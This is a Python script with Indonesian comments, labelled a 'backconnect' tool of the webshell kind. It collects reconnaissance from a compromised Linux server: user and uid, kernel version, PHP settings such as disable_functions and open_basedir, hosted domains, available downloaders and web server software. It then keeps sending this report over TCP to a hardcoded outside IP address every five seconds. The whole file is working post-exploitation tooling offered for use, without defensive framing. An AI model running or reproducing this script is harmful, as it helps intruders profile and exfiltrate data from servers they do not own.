#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import time
import sys

# Konfigurasi
TARGET_IP = "103.125.43.187"  # Ganti dengan IP client Anda
TARGET_PORT = 2012            # Port yang Anda dengarkan di client
RECONNECT_INTERVAL = 5        # Interval reconnect (detik)

def get_system_info():
    info = {}
    
    # Uname
    try:
        info['uname'] = subprocess.check_output(['uname', '-a']).decode().strip()
    except:
        info['uname'] = "Unknown"
    
    # User dan Group
    try:
        info['user'] = subprocess.check_output(['id', '-un']).decode().strip()
        info['group'] = subprocess.check_output(['id', '-gn']).decode().strip()
        info['uid'] = subprocess.check_output(['id', '-u']).decode().strip()
        info['gid'] = subprocess.check_output(['id', '-g']).decode().strip()
    except:
        info['user'] = "Unknown"
        info['group'] = "Unknown"
        info['uid'] = "Unknown"
        info['gid'] = "Unknown"
    
    # PHP dan Safe Mode
    try:
        php_version = subprocess.check_output(['php', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0].split(' ')[1]
        info['php_version'] = php_version
        
        # Get safe mode status
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'safe_mode' in line and '=>' in line:
                info['safe_mode'] = line.split('=>')[1].strip()
                break
        else:
            info['safe_mode'] = "N/A"
    except:
        info['php_version'] = "Not Installed"
        info['safe_mode'] = "N/A"
    
    # IP Server
    try:
        info['server_ip'] = subprocess.check_output(['hostname', '-I']).decode().split()[0]
    except:
        info['server_ip'] = "Unknown"
    
    # DateTime
    info['datetime'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # Domains
    if os.path.exists('/etc/named.conf'):
        try:
            with open('/etc/named.conf', 'r') as f:
                content = f.read()
                domains = content.count('zone "')
                info['domains'] = str(domains)
        except:
            info['domains'] = "Cant Read [ /etc/named.conf ]"
    else:
        info['domains'] = "Cant Read [ /etc/named.conf ]"
    
    # HDD
    try:
        df_output = subprocess.check_output(['df', '-h', '/']).decode()
        lines = df_output.split('\n')
        if len(lines) > 1:
            parts = lines[1].split()
            if len(parts) >= 4:
                # Ganti f-string dengan format() untuk kompatibilitas Python 2
                info['hdd'] = "Total:{} Free:{} [{}]".format(parts[1], parts[3], parts[4])
            else:
                info['hdd'] = "Unknown"
        else:
            info['hdd'] = "Unknown"
    except:
        info['hdd'] = "Unknown"
    
    # Useful Commands
    info['useful'] = "gcc cc ld make php perl python tar gzip locate"
    
    # Downloader
    downloader = []
    if subprocess.call(['which', 'wget'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        downloader.append("wget")
    if subprocess.call(['which', 'curl'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        downloader.append("curl")
    info['downloader'] = " ".join(downloader) if downloader else "None"
    
    # Disable Functions (PHP)
    try:
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'disable_functions' in line and '=>' in line:
                disable_functions = line.split('=>')[1].strip()
                if disable_functions == 'no value':
                    info['disable_functions'] = "All Functions Accessible"
                else:
                    info['disable_functions'] = disable_functions
                break
        else:
            info['disable_functions'] = "All Functions Accessible"
    except:
        info['disable_functions'] = "PHP Not Installed"
    
    # PHP Modules
    php_modules = {
        'curl': False,
        'ssh2': False,
        'mysqli': False,
        'mssql': False,
        'pgsql': False,
        'oci8': False,
        'cgi': False
    }
    
    try:
        php_modules_output = subprocess.check_output(['php', '-m'], stderr=subprocess.DEVNULL).decode()
        for module in php_modules:
            if module in php_modules_output:
                php_modules[module] = True
    except:
        pass
    
    info['curl_status'] = "ON" if php_modules['curl'] else "OFF"
    info['ssh2_status'] = "ON" if php_modules['ssh2'] else "OFF"
    info['mysql_status'] = "ON" if php_modules['mysqli'] else "OFF"
    info['mssql_status'] = "ON" if php_modules['mssql'] else "OFF"
    info['pgsql_status'] = "ON" if php_modules['pgsql'] else "OFF"
    info['oracle_status'] = "ON" if php_modules['oci8'] else "OFF"
    info['cgi_status'] = "ON" if php_modules['cgi'] else "OFF"
    
    # Magic Quotes
    try:
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'magic_quotes_gpc' in line and '=>' in line:
                info['magic_quotes'] = line.split('=>')[1].strip()
                break
        else:
            info['magic_quotes'] = "N/A"
    except:
        info['magic_quotes'] = "N/A"
    
    # Open_basedir, etc.
    try:
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'open_basedir' in line and '=>' in line:
                info['open_basedir'] = line.split('=>')[1].strip()
                break
        else:
            info['open_basedir'] = "NONE"
    except:
        info['open_basedir'] = "NONE"
    
    try:
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'safe_mode_exec_dir' in line and '=>' in line:
                info['safe_mode_exec_dir'] = line.split('=>')[1].strip()
                break
        else:
            info['safe_mode_exec_dir'] = "NONE"
    except:
        info['safe_mode_exec_dir'] = "NONE"
    
    try:
        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
        for line in php_info.split('\n'):
            if 'safe_mode_include_dir' in line and '=>' in line:
                info['safe_mode_include_dir'] = line.split('=>')[1].strip()
                break
        else:
            info['safe_mode_include_dir'] = "NONE"
    except:
        info['safe_mode_include_dir'] = "NONE"
    
    # Software Web Server
    if subprocess.call(['which', 'apache2'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        try:
            info['software'] = subprocess.check_output(['apache2', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0]
        except:
            info['software'] = "Apache (version unknown)"
    elif subprocess.call(['which', 'httpd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        try:
            info['software'] = subprocess.check_output(['httpd', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0]
        except:
            info['software'] = "Httpd (version unknown)"
    elif subprocess.call(['which', 'nginx'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
        try:
            info['software'] = subprocess.check_output(['nginx', '-v'], stderr=subprocess.DEVNULL).decode().strip()
        except:
            info['software'] = "Nginx (version unknown)"
    else:
        info['software'] = "Unknown"
    
    return info

def send_info():
    info = get_system_info()
    
    # Header
    output = "\033[1;32m========================================\033[0m\n"
    output += "\033[1;31m      BACKCONNECT SUCCESSFUL\033[0m\n"
    output += "\033[1;32m========================================\033[0m\n\n"
    
    # Uname
    output += "\033[1;33mUname:\033[0m\t\033[1;37m{}\033[0m\n".format(info['uname'])
    
    # User dan Group
    output += "\033[1;33mUser:\033[0m\t\033[1;37m{} [ {} ] Group: {} [ {} ]\033[0m\n".format(
        info['uid'], info['user'], info['gid'], info['group'])
    
    # PHP
    output += "\033[1;33mPHP:\033[0m\t\033[1;37m{} Safe Mode: {}\033[0m\n".format(
        info['php_version'], info['safe_mode'])
    
    # IP
    output += "\033[1;33mServerIP:\033[0m\t\033[1;37m{} Your IP: {}\033[0m\n".format(
        info['server_ip'], TARGET_IP)
    
    # DateTime
    output += "\033[1;33mDateTime:\033[0m\t\033[1;37m{}\033[0m\n".format(info['datetime'])
    
    # Domains
    output += "\033[1;33mDomains:\033[0m\t\033[1;37m{}\033[0m\n".format(info['domains'])
    
    # HDD
    output += "\033[1;33mHDD:\033[0m\t\033[1;37m{}\033[0m\n".format(info['hdd'])
    
    # Useful
    output += "\033[1;33mUseful :\033[0m\t\033[1;37m{}\033[0m\n".format(info['useful'])
    
    # Downloader
    output += "\033[1;33mDownloader:\033[0m\t\033[1;37m{}\033[0m\n".format(info['downloader'])
    
    # Disable Functions
    output += "\033[1;33mDisable Functions:\033[0m\t\033[1;37m{}\033[0m\n".format(info['disable_functions'])
    
    # PHP Modules
    output += "\033[1;33mCURL :\033[0m\t\033[1;37m{} | SSH2 : {} | Magic Quotes : {} | MySQL : {} | MSSQL : {} | PostgreSQL : {} | Oracle : {} | CGI : {}\033[0m\n".format(
        info['curl_status'], info['ssh2_status'], info['magic_quotes'], 
        info['mysql_status'], info['mssql_status'], info['pgsql_status'],
        info['oracle_status'], info['cgi_status'])
    
    # Open_basedir, etc.
    output += "\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{} | Safe_mode_exec_dir : {} | Safe_mode_include_dir : {}\033[0m\n".format(
        info['open_basedir'], info['safe_mode_exec_dir'], info['safe_mode_include_dir'])
    
    # Software
    output += "\033[1;33mSoftWare:\033[0m\t\033[1;37m{}\033[0m\n".format(info['software'])
    
    output += "\n"
    output += "\033[1;32m========================================\033[0m\n"
    output += "\033[1;31m            END OF INFO\033[0m\n"
    output += "\033[1;32m========================================\033[0m\n\n"
    
    return output

def backconnect():
    while True:
        print("[*] Mencoba koneksi ke {}:{}".format(TARGET_IP, TARGET_PORT))
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(send_info().encode())
            s.close()
            print("[*] Informasi terkirim!")
        except Exception as e:
            print("[!] Koneksi gagal: {}".format(str(e)))
        
        print("[!] Reconnect dalam {} detik...".format(RECONNECT_INTERVAL))
        time.sleep(RECONNECT_INTERVAL)

if __name__ == "__main__":
    backconnect()
